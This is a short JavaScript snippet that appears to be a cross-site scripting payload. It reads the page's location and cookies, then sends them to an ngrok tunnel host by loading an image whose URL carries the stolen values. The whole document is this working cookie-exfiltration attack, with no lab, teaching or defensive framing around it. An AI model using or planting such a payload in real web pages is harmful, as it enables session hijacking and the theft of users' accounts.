loc = document.location
cookie = document.cookie
var img1 = document.createElement('img');
img1.src = 'http://444fd175.ngrok.io/image.png?loc='+loc+';cookie:'+cookie;
document.body.appendChild(img1);
